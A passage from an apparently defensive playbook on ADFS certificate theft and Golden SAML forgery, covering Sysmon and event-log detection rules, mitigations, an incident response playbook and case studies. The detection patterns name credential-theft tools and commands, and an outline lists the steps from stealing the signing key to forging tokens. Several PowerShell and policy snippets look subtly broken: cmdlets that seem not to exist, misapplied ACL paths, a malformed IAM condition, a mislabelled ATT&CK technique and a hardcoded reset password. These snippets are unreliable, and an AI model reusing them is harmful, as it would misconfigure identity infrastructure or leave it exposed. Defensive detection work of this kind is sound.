Set-Acl -Path $registryPath -AclObject $acl
```

---

### Event Log 4: PowerShell Script Block Logging

**Event ID:** 4103 (Module Logging), 4104 (Script Block Logging)

- **Log Source:** Microsoft-Windows-PowerShell/Operational
- **Trigger:** PowerShell script containing certificate export commands
- **Filter:** "ScriptBlockText contains Export-PfxCertificate OR ScriptBlockText contains AADInternals"
- **Applies To:** All Windows systems (enable on ADFS servers especially)

**Manual Configuration:**

```powershell
# Enable PowerShell Script Block Logging via GPO
# Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell
# → Set "Turn on PowerShell Script Block Logging" to "Enabled"

# Or via Registry
$regPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $regPath -Force | Out-Null
New-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 1 -Force
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows (ADFS Server, Domain Controllers)

**Sysmon Configuration Snippet:**

```xml
<!-- Detect CertUtil certificate export -->
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- File Create: .pfx files being written -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains any">
        .pfx;.p12;.p7b;.cer;.crt
      </TargetFilename>
    </FileCreate>

    <!-- Process Creation: CertUtil with exportPFX -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">
        certutil -exportPFX;
        Export-PfxCertificate;
        Export-AADIntADFSCertificates;
        crypto pki export
      </CommandLine>
    </ProcessCreate>

    <!-- Image Load: Loading AADInternals or ADFS-related DLLs -->
    <ImageLoad onmatch="include">
      <ImageLoaded condition="contains any">
        AADInternals.dll;
        Microsoft.IdentityModel.dll;
        System.IdentityModel.Tokens.dll
      </ImageLoaded>
    </ImageLoad>

    <!-- Named Pipe: DKMS SQL queries (ADFSDump detection) -->
    <PipeEvent onmatch="include">
      <PipeName condition="contains">
        \\microsoft##wid\\tsql\\query
      </PipeName>
      <Image condition="excludes">
        sqlservr.exe;
        servicetier.exe
      </Image>
    </PipeEvent>

    <!-- Network Connection: To AWS/Azure federation endpoints -->
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains any">
        sts.amazonaws.com;
        login.microsoftonline.com;
        accounts.google.com
      </DestinationHostname>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with XML above
3. Install Sysmon with config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Alert 1: Suspicious Certificate Export from Identity Service

**Alert Name:** "Suspicious certificate export from identity service"

- **Severity:** Critical
- **Description:** Detects attempts to export ADFS or Azure AD certificates outside of normal business context
- **Applies To:** ADFS servers, Azure AD Connect servers
- **Remediation:** 
  1. Immediately revoke exported certificates
  2. Rotate all federation certificates
  3. Investigate account that initiated export
  4. Review SAML tokens issued after export time

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON (monitors on-premises AD/ADFS)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Alert Trigger Conditions:**
- ProcessName = "certutil.exe" AND CommandLine contains "-exportPFX"
- OR ProcessName = "powershell.exe" AND ScriptBlockText contains "Export-PfxCertificate"
- AND SignatureStatus != "Microsoft"
- AND NOT (UserName IN {authorized_admins})

---

### Alert 2: Workload Identity Abuse in Multi-Cloud Environment

**Alert Name:** "Potential workload identity federation abuse"

- **Severity:** High
- **Description:** Detects suspicious service account token exchange across cloud boundaries
- **Applies To:** GCP, AWS IAM, Azure Service Principals
- **Remediation:**
  1. Review identity pool provider configurations
  2. Implement attribute mapping restrictions
  3. Enable IP-based access controls
  4. Rotate service account keys

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: ADFS Certificate Changes

```powershell
# Connect to Purview
Connect-ExchangeOnline

# Search for certificate-related operations
Search-UnifiedAuditLog -Operations "Add-ADFSCertificate", "Remove-ADFSCertificate", "Set-ADFSCertificate" `
    -StartDate (Get-Date).AddDays(-30) `
    -EndDate (Get-Date)

# Parse audit data
Search-UnifiedAuditLog -Operations "*Certificate*" `
    -StartDate (Get-Date).AddDays(-7) | 
    ForEach-Object {
        $auditData = $_.AuditData | ConvertFrom-Json
        [PSCustomObject]@{
            TimeStamp = $auditData.CreationTime
            Operation = $auditData.Operation
            User = $auditData.UserId
            Details = $auditData.ExtendedProperties
        }
    }
```

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate

**Manual Configuration Steps (Search Audit Logs):**

1. Go to **Audit** → **Search**
2. Set **Date range** (Last 30 days)
3. Under **Activities**, select:
   - `Add-ADFSCertificate`
   - `Remove-ADFSCertificate`
   - `Add-AzureADMSApplicationVerifiedPublisher`
   - `Update-AzureADMSApplicationOwner`
4. Under **Users**, enter specific admin accounts or leave blank for all
5. Click **Search**
6. Export results: **Export** → **Download all results**

**PowerShell Alternative:**

```powershell
$startDate = (Get-Date).AddDays(-30)
$endDate = Get-Date

$auditResults = Search-UnifiedAuditLog -StartDate $startDate -EndDate $endDate `
    -Operations "*Certificate*" -ResultSize 5000

$auditResults | Export-Csv -Path "C:\Audit\CertificateChanges.csv" -NoTypeInformation
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Mitigation 1.1: Implement Hardware Security Module (HSM) for DKMS Key Storage

**Objective:** Prevent private key export even if admin access is compromised

**Applies To:** Windows Server 2016+, ADFS 3.0+

**Manual Steps (Azure Key Vault with HSM):**

1. Go to **Azure Portal** → **Key Vaults**
2. Click **+ Create**
3. Configure:
   - **Pricing Tier:** Premium (HSM-backed)
   - **Key Management:** Enable **Purge Protection**
4. Under **Keys**, click **+ Generate/Import**
5. Create key with:
   - **Key Type:** RSA
   - **Key Size:** 4096-bit
   - **Operations:** Sign, Verify
6. Configure ADFS to use Key Vault:

```powershell
# Install Azure Key Vault PowerShell module
Install-Module -Name Az.KeyVault

# Configure ADFS to use HSM-backed key
$vaultName = "MyKeyVault"
$keyName = "ADFS-TokenSigningKey"
$resourceGroup = "SecurityResourceGroup"

# Create the key in HSM
$key = Add-AzKeyVaultKey -VaultName $vaultName -Name $keyName `
    -Destination HSM -Size 4096

# Export certificate for federation metadata
$cert = Get-AzKeyVaultSecret -VaultName $vaultName -Name $keyName
Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\ADFS-PublicCert.cer"
```

**Manual Steps (Windows/PowerShell on-premises HSM):**

1. Obtain hardware security module (Thales, Yubico, etc.)
2. Initialize HSM and generate master key
3. Configure ADFS service account with HSM access:

```powershell
# Grant ADFS service account access to HSM
# (Vendor-specific, consult HSM documentation)

# Verify ADFS uses HSM key
Get-AdfsCertificate | Select-Object Thumbprint, CertificateType, CertificateStore

# Should show: CertificateStore = "HSM"
```

---

#### Mitigation 1.2: Enforce Strict Access Control List (ACL) on DKMS

**Objective:** Limit who can access the DKMS private key to only ADFS service account

**Applies To:** Windows Server 2016+

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **File Systems**
3. Add permissions to `C:\ProgramData\Microsoft\Windows\Hyper-V\Identity`
4. Set:
   - **Owner:** ADFS Service Account
   - **Permissions:** 
     - Read: ADFS Service Account ONLY
     - Deny: Domain Admins, Enterprise Admins
5. Run `gpupdate /force`

**Manual Steps (PowerShell):**

```powershell
# Get ADFS service account
$adfsAccount = Get-ADServiceAccount -Filter 'Name -like "*ADFS*'
$accountName = $adfsAccount.Name

# Set registry ACL for DKMS
$regPath = "HKLM:\Software\Microsoft\ADFS"
$acl = Get-Acl -Path $regPath

# Remove all permissions except SYSTEM and ADFS service account
$acl.Access | Where-Object {$_.IdentityReference -notmatch ($accountName + "|SYSTEM")} | 
    ForEach-Object { $acl.RemoveAccessRule($_) }

Set-Acl -Path $regPath -AclObject $acl

# Verify
Get-Acl -Path $regPath | Select-Object -ExpandProperty Access
```

---

#### Mitigation 1.3: Enable Certificate Pinning for Federated Services

**Objective:** Prevent use of cloned certificates by locking public key pins

**Applies To:** AWS, Azure, Salesforce, any SAML service provider

**Manual Steps (AWS SAML Provider Certificate Pinning):**

```bash
# Step 1: Extract certificate from ADFS federation metadata
curl -s "https://sts.contoso.com/adfs/fs/federationmetadata/2007-06/federationmetadata.xml" | \
    grep -oP '<KeyDescriptor use="signing".*?</KeyDescriptor>' | \
    sed 's/.*<X509Certificate>\(.*\)<\/X509Certificate>.*/\1/' | \
    base64 -d > adfs_cert.der

# Step 2: Generate certificate fingerprint (Subject Public Key Info)
openssl x509 -in adfs_cert.der -inform DER -pubkey -noout | \
    openssl pkey -pubin -outform DER | openssl dgst -sha256 -binary | \
    openssl enc -base64

# Step 3: Store fingerprint in AWS SAML provider configuration
aws iam update-saml-provider \
    --saml-metadata-document file://metadata.xml \
    --saml-provider-arn arn:aws:iam::123456789012:saml-provider/contoso-adfs
```

**Pinning Verification:**
```bash
# Verify certificate matches pinned key before accepting SAML response
openssl x509 -in response_cert.pem -pubkey -noout | \
    openssl pkey -pubin -outform DER | openssl dgst -sha256 -binary | \
    openssl enc -base64 | grep -F "PINNED_KEY_HASH"
```

---

#### Mitigation 1.4: Disable Legacy Authentication Protocols

**Objective:** Force use of modern SAML 2.0, OIDC; disable WS-FED if possible

**Applies To:** ADFS, Entra ID, AWS

**Manual Steps (ADFS):**

```powershell
# Disable WS-FED (legacy protocol)
Set-AdfsProperties -WsFedPassiveEndpointEnabled $false

# Require SAML 2.0
Set-AdfsProperties -RequireCertificateForEncryption $true

# Enforce token encryption
Get-AdfsRelyingPartyTrust | Set-AdfsRelyingPartyTrust -EncryptionRequired $true

# Verify changes
Get-AdfsProperties | Select-Object WsFedPassiveEndpointEnabled, EncryptTokens
```

**Manual Steps (Azure/Entra ID):**

1. Navigate to **Azure Portal** → **Entra ID** → **Federated credentials**
2. For each federated domain, set:
   - **Federation metadata location:** Ensure SAML 2.0 endpoint
   - **Authentication URLs:** Use HTTPS only
   - **Disable WS-Fed:** Yes (if supported by ADFS version)
3. Click **Save**

---

### Priority 2: HIGH

#### Mitigation 2.1: Implement Certificate Rotation Policy

**Objective:** Regularly rotate federation certificates to limit exposure window

**Applies To:** ADFS (all versions), Azure AD Connect, AWS SAML

**Manual Steps (ADFS Automatic Certificate Rollover):**

```powershell
# Enable automatic certificate promotion (default is 5 days)
Set-ADFSProperties -CertificatePromotionThreshold 10

# Create secondary certificate
Add-AdfsCertificate -CertificateType Token-Signing -Thumbprint "NEW_CERT_THUMBPRINT"

# Verify certificates
Get-AdfsCertificate | Select-Object CertificateType, Thumbprint, IsPrimary

# After 10 days, secondary becomes primary automatically
# Download updated federation metadata to relying parties
$federationMetadata = Get-AdfsProperties | Select-Object FederationMetadataLocation
```

**Manual Steps (Azure AD Connect - Manual Rotation):**

```powershell
# If certificate expiring soon, enroll new certificate from ADCS
# on Azure AD Connect server

# Request new certificate with subject matching old certificate
certreq -new request.inf azureadconnect.cer

# Update Azure AD with new certificate
# In Azure Portal → Entra ID → Hybrid identity → Azure AD Connect
# Upload new certificate in federation settings

# Verify new certificate active
Get-MgOrganization | Select-Object id, DisplayName
```

---

#### Mitigation 2.2: Conditional Access for Federation Operations

**Objective:** Restrict who can modify federation settings and when

**Applies To:** Azure AD, AWS IAM

**Manual Steps (Entra ID Conditional Access):**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Restrict Federation Configuration Changes`
4. **Assignments:**
   - Users: Directory Synchronization Accounts, Hybrid Identity Admins
   - Cloud apps: **Office 365 Exchange Online** + **Azure Portal**
5. **Conditions:**
   - Locations: **Named location** (restrict to on-premises only)
   - Device platforms: **Windows**, **MacOS**
   - Sign-in risk: **High**
6. **Access controls:**
   - Grant: **Require MFA** + **Require compliant device**
7. Enable policy: **On**
8. Click **Create**

**Manual Steps (AWS IAM Policy for Federation):**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyFederationChangesOutsideBusinessHours",
      "Effect": "Deny",
      "Action": [
        "iam:CreateSAMLProvider",
        "iam:UpdateSAMLProvider",
        "iam:DeleteSAMLProvider"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:CurrentTime": [
            "2024-01-01T09:00:00Z/*",
            "2024-01-01T17:00:00Z/*"
          ]
        },
        "NotIpAddress": {
          "aws:SourceIp": "10.0.0.0/8"  // Office network only
        }
      }
    }
  ]
}
```

---

#### Mitigation 2.3: Monitor and Alert on Federation Trust Modifications

**Objective:** Real-time detection of changes to federation metadata, certificates, trust relationships

**Applies To:** All platforms

**Manual Steps (ADFS monitoring via PowerShell):**

```powershell
# Create scheduled task to monitor ADFS changes
$trigger = New-ScheduledTaskTrigger -Daily -At 06:00AM
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument @"
-NoProfile -WindowStyle Hidden -Command {
  `$adfsProps = Get-AdfsProperties
  `$rpTrusts = Get-AdfsRelyingPartyTrust
  `$certs = Get-AdfsCertificate
  
  # Export current state
  [PSCustomObject]@{
    Timestamp = Get-Date
    RelyingParties = `$rpTrusts.Count
    Certificates = `$certs.Count
    CertificateThumbprints = (`$certs | Select-Object -ExpandProperty Thumbprint)
  } | Export-Clixml "C:\Monitoring\ADFS_State.xml"
  
  # Compare with previous state
  `$prevState = Import-Clixml "C:\Monitoring\ADFS_State_Previous.xml" -ErrorAction SilentlyContinue
  if (`$prevState) {
    if (`$prevState.CertificateThumbprints -ne `$certs.Thumbprint) {
      Send-AlertToSOC "ADFS certificates changed"
    }
  }
}
"@

Register-ScheduledTask -TaskName "MonitorADFSChanges" -Trigger $trigger -Action $action
```

---

### Priority 3: MEDIUM

#### Mitigation 3.1: Implement Multi-Factor Authentication for Federation Admin Access

**Objective:** Require MFA for any admin accounts with access to ADFS, Azure AD Connect, federation configuration

**Manual Steps:**

```powershell
# Identify all accounts with federation admin roles
Get-AzRoleAssignment -RoleDefinitionName "*Admin*" | 
    Where-Object {$_.Scope -match "federation|identity"}

# For each account, require MFA
# In Azure Portal → Entra ID → Users → Require MFA
# Or via Azure AD MFA settings
```

---

#### Mitigation 3.2: Implement Federated Identity Federation Attribute Mapping Restrictions (GCP WIF)

**Objective:** Restrict which external identities can access service accounts via strict attribute conditions

**Manual Steps (GCP):**

```bash
# When creating OIDC provider, define strict attribute conditions
gcloud iam workload-identity-pools providers create-oidc my-provider \
  --location=global \
  --workload-identity-pool=my-pool \
  --display-name="My OIDC Provider" \
  --attribute-mapping="google.subject=assertion.sub,attribute.audience=assertion.aud" \
  --issuer-uri="https://auth.example.com" \
  --attribute-condition="assertion.aud == 'my-app' && assertion.sub.startsWith('user-')"
```

---

#### Mitigation 3.3: Implement Certificate Transparency Monitoring

**Objective:** Monitor for issuance of certificates matching federation domain names via CT logs

**Manual Steps:**

```bash
# Use Certificate Transparency monitoring service
# Services: crt.sh, Google Certificate Transparency Monitor, Sectigo Cert Intelligence

# Query for federation domain certificates
curl "https://crt.sh/?q=%.contoso.com&output=json" | jq '.[] | select(.name_value | contains("adfs"))'

# Alert if unexpected certificates issued for federation domain
```

---

#### Mitigation 3.4: Enforce MFA for All Federated User Access

**Objective:** Require MFA even when SAML token valid, to catch Golden SAML attacks

**Manual Steps (Azure Conditional Access):**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create new policy:
   - **Name:** `Require MFA for All Cloud Apps`
   - **Users:** All users
   - **Cloud apps:** All cloud apps
   - **Access controls:** **Require MFA**
   - **Enable:** On

---

## 15. DETECTION & INCIDENT RESPONSE

### Detection Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                 Threat Detection Pathway                    │
└─────────────────────────────────────────────────────────────┘
                             │
         ┌───────────────────┴───────────────────┐
         ▼                                       ▼
    Phase 1: Credential Access          Phase 2: Token Usage
    (Certificate Theft)                 (Lateral Movement)
         │                                       │
    ┌────┴──────────────────┐          ┌────────┴─────────────┐
    │                       │          │                      │
    ▼                       ▼          ▼                       ▼
Event 1007             Event 4663   SAML Token without   Cross-cloud
(Cert Export)       (Registry Mod)   Kerberos Event      Privilege
    │                   │                   │            Escalation
    └───────┬───────────┘                   │                │
            │                               │                │
      ALERT: Suspicious               ALERT: Forged     ALERT: Anomalous
      Certificate Export              SAML Detection     Cross-cloud Access
            │                               │                │
            └───────────────┬───────────────┴────────────────┘
                            │
                    ┌───────▼────────┐
                    │ Escalate to    │
                    │ Incident Team  │
                    │ (Critical)     │
                    └────────────────┘
```

### Incident Response Playbook

**Initial Detection (0-30 minutes):**

1. **Verify Alert Authenticity**
   - Check if alert triggered by test/maintenance
   - Confirm certificate export tool execution via Sysmon logs
   - Validate EventID 1007 or 4103 log entry

2. **Contain Compromised Account**
   ```powershell
   # Disable account immediately
   Disable-ADAccount -Identity "compromised_admin"
   
   # Force logout of all sessions
   Remove-ADGroupMember -Identity "Administrators" -Members "compromised_admin" -Confirm:$false
   
   # Reset password
   Set-ADAccountPassword -Identity "compromised_admin" -NewPassword (ConvertTo-SecureString "TempPassword123!" -AsPlainText -Force) -Reset
   ```

3. **Revoke Exported Certificate**
   ```powershell
   # Revoke ADFS certificate
   $cert = Get-AdfsCertificate | Where-Object {$_.Thumbprint -eq "EXPORTED_THUMBPRINT"}
   Revoke-AdfsCertificate -CertificateHash $cert.CertificateHash
   ```

**Investigation Phase (30-120 minutes):**

1. **Identify Exported Certificates**
   ```powershell
   # Query event logs for all export events in last 72 hours
   Get-WinEvent -LogName "Microsoft-Windows-CertificateServicesClient-Lifecycle-System" `
       -FilterHashtable @{EventID=1007; StartTime=(Get-Date).AddDays(-3)} |
       Select-Object TimeCreated, Message
   ```

2. **Check for Token Forgery**
   ```powershell
   # Search ADFS logs for SAML tokens without corresponding Kerberos events
   $adfsLogins = Get-WinEvent -LogName "AD FS/Admin" -FilterHashtable @{EventID=501; StartTime=(Get-Date).AddHours(-24)}
   
   foreach ($login in $adfsLogins) {
       $userData = $login.Properties[4].Value  # User principal name
       
       # Check for corresponding Kerberos event on DC
       $krbtgtEvent = Get-WinEvent -LogName Security -FilterHashtable @{EventID=4769; StartTime=(Get-Date).AddHours(-24)} |
           Where-Object {$_.Properties[0].Value -eq $userData}
       
       if (-not $krbtgtEvent) {
           Write-Warning "POTENTIAL GOLDEN SAML: $userData authenticated without Kerberos event"
       }
   }
   ```

3. **Timeline Analysis**
   - When was certificate exported?
   - What user/service account initiated export?
   - Has any SAML token been used after export time?
   - What cloud resources were accessed?

**Eradication Phase (2-4 hours):**

1. **Rotate All Federation Certificates**
   ```powershell
   # Create new token-signing certificate
   Add-AdfsCertificate -CertificateType Token-Signing
   
   # Wait for secondary cert to become primary (default 5 days)
   # Or manually promote
   Set-AdfsProperties -CertificatePromotionThreshold 0
   
   # Update all relying parties with new metadata
   Update-AdfsRelyingPartyTrust -Thumbprint "NEW_CERT_THUMBPRINT"
   ```

2. **Invalidate Forged Tokens**
   ```powershell
   # Revoke previous certificate
   Remove-AdfsCertificate -CertificateHash "EXPORTED_CERT_HASH"
   
   # Force re-authentication for all users
   # (Depends on cloud provider - usually requires metadata update)
   ```

3. **Force Password Reset for All Admins**
   ```powershell
   Get-ADGroupMember -Identity "Domain Admins" | ForEach-Object {
       Set-ADUser -Identity $_ -ChangePasswordAtLogon $true
   }
   ```

4. **Revoke OAuth/SAML Tokens**
   ```powershell
   # In Microsoft 365
   Connect-MgGraph
   Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.com'" | 
       Invoke-MgGraphRequest -Method POST -Uri "/users/$($_.Id)/revokeSignInSessions"
   ```

**Verification Phase (4-24 hours):**

1. **Verify Certificate Rotation Complete**
2. **Confirm No Active Forged Tokens**
3. **Review Audit Logs for Anomalous Access**
4. **Update Incident Ticket with Root Cause Analysis**

---

## 16. RELATED ATTACK CHAINS

### Related Technique 1: T1606.002 - Forge SAML Response

**Dependency:** CA-UNSC-020 (Certificate theft) → T1606.002 (SAML forging)

**Link:** Once certificate is stolen, SAML responses can be forged using the extracted private key

**Attack Chain:**
```
1. Steal ADFS certificate/key (CA-UNSC-020)
2. Forge SAML response claiming any user (T1606.002)
3. Present forged response to cloud app
4. Gain unauthorized access without MFA
```

---

### Related Technique 2: T1550.001 - Use Alternate Authentication Material

**Dependency:** Stolen token → authentication bypass

**Link:** Forged SAML tokens are "alternate authentication material" used instead of passwords

---

### Related Technique 3: T1098 - Account Manipulation

**Dependency:** After lateral movement via Golden SAML, attacker manipulates cloud accounts

**Link:** Create backdoor accounts, escalate privileges, modify federation settings

---

### Related Technique 4: T1556.004 - Modify Authentication Mechanism - Network Device

**Dependency:** Compromise of federation infrastructure enables authentication bypass

**Link:** Attackers can modify relying party trusts, add new IdPs, or update federation metadata

---

## 17. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (APT29, December 2020)

**Incident Summary:**
APT29 compromised SolarWinds supply chain and deployed malware (Sunburst) to numerous government and Fortune 500 organizations. Once inside target networks, APT29 extracted ADFS certificates and forged SAML tokens to access Office 365, AWS, and Azure environments.

**Attack Steps:**

1. **Initial Compromise:** SolarWinds Orion software (Sunburst backdoor)
2. **Lateral Movement:** From SolarWinds server to on-premises AD environment
3. **Privilege Escalation:** Obtained Domain Admin credentials
4. **Certificate Theft:** Extracted ADFS token signing certificate from DKMS
5. **Token Forging:** Created forged SAML responses as admin accounts
6. **Cloud Breach:** Accessed Office 365, Teams, Exchange for data exfiltration

**Impact:**
- Access to email and SharePoint of multiple government agencies
- Ability to read all emails and files
- Persistent backdoor access lasting months
- Estimated >18,000 organizations affected

**Detection Failures:**
- ADFS certificate export not properly monitored
- No correlation between SAML tokens and Kerberos events
- Relying parties didn't validate token issuer timestamp

**Mitigation Applied (Post-Incident):**
- Microsoft released ADFS attack surface reduction (2021)
- Customers implemented HSM for DKMS keys
- Enforce token encryption and signature validation
- Deploy certificate transparency monitoring

**Reference:** [CISA SolarWinds Alert AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-calls-all-organizations-immediately-change-solarwinds-orion-platform-versions)

---

### Example 2: Golden SAML Attack Against Enterprise (CyberArk 2017)

**Incident Summary:**
First public disclosure of Golden SAML attack by CyberArk researchers. Demonstrated ability to forge SAML tokens using stolen ADFS certificate on multiple target organizations.

**Attack Simulation:**
1. Gain admin access to ADFS server
2. Export token signing certificate via Get-AdfsCertificate
3. Extract private key from DKMS using ADFSDump
4. Generate valid SAML assertion for any user using forged signature
5. Authenticate to AWS, Office 365, Salesforce without credentials

**Key Findings:**
- ADFS was single point of failure for entire federated ecosystem
- No audit logging of certificate exports by default
- Service accounts with excessive permissions to DKMS
- Relying parties didn't verify token timestamp or request ID

**Remediation Recommended:**
- Store DKMS key on HSM
- Restrict access to DKMS to ADFS service account only
- Monitor certificate exports
- Implement conditional access policies
- Enforce device compliance for federation admin access

**Reference:** [CyberArk Golden SAML Research](https://www.cyberark.com/blog/golden-saml-the-golden-ticket-to-identity/)

---

### Example 3: GCP Workload Identity Federation Misconfiguration

**Incident Summary:**
Security research by Tenable discovered multiple misconfigurations in GCP Workload Identity Federation implementations that allow privilege escalation across cloud boundaries.

**Vulnerability Details:**

**Vector 1 - Overpermissive Default OIDC Provider:**
- GCP WIF pools configured to accept OIDC tokens from ANY identity matching issuer URL
- No attribute conditions restricting which subjects can federate
- Result: Any user in external IdP (Azure tenant, AWS account) can assume highly-privileged GCP service account

**Vector 2 - Provider Update Permission Abuse:**
- Attacker with `iam.workloadIdentityPoolProviders.update` permission
- Updates existing provider to add attacker's AWS account
- Attacker can now assume target's GCP service account from their own AWS environment

**Vector 3 - Cross-Cloud Service Account Chaining:**
- GCP pool linked to AWS account
- AWS account linked to Azure tenant
- Azure tenant linked back to GCP
- Attacker can chain identities across all clouds

**Impact:**
- Cross-cloud privilege escalation
- Lateral movement from one cloud to another
- Persistent backdoor access across multi-cloud infrastructure

**Remediation:**
```bash
# Implement strict attribute mapping
gcloud iam workload-identity-pools providers update my-provider \
  --attribute-condition="assertion.sub == 'allowed-subject-only' && assertion.aud == 'my-app'"

# Use principal-sets to restrict service account access
gcloud iam service-accounts add-iam-policy-binding target-sa@project.iam.gserviceaccount.com \
  --role='roles/iam.workloadIdentityUser' \
  --principal='principalSet://iam.googleapis.com/locations/global/workloadIdentityPools/my-pool/principalSets/ALLOWED_SET'
```

**Reference:** [Tenable GCP WIF Security Research](https://www.tenable.com/blog/how-attackers-can-exploit-gcps-multicloud-workload-solution)

---

## APPENDIX: References & Resources

### Official Documentation
- [MITRE ATT&CK T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/)
- [Microsoft ADFS Deployment Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview)
- [Azure Key Vault Overview](https://learn.microsoft.com/en-us/azure/key-vault/general/overview)
- [GCP Workload Identity Federation](https://cloud.google.com/docs/authentication/workload-identity-federation)
- [AWS IAM Roles Anywhere](https://docs.aws.amazon.com/rolesanywhere/latest/userguide/introduction.html)

### Security Research & Tools
- [CyberArk Golden SAML](https://www.cyberark.com/blog/golden-saml-the-golden-ticket-to-identity/)
- [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals)
- [Atomic Red Team - T1552.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md)
- [Splunk Security Content](https://github.com/splunk/security-content)

### Compliance Frameworks
- **CIS Controls v8:** 
  - 6.2 Address Unauthorized Software
  - 13.2 Collect and Analyze Logs
- **NIST Cybersecurity Framework:**
  - ID.RA-2: Data, processes, and systems are inventoried
  - DE.CM-1: The network is monitored for unauthorized use
  - RS.RP-1: Response procedures are executed
- **GDPR Article 32:** Security of processing (encryption, key management)
- **DORA (Digital Operational Resilience Act):** ICT incident logging and reporting
- **NIS2 Directive:** Critical infrastructure protection, incident notification
- **ISO 27001:2022:** 
  - A.10.1.1: Cryptographic Controls
  - A.9.2.1: User Registration and Deregistration
  - A.12.4.1: Event Logging

---
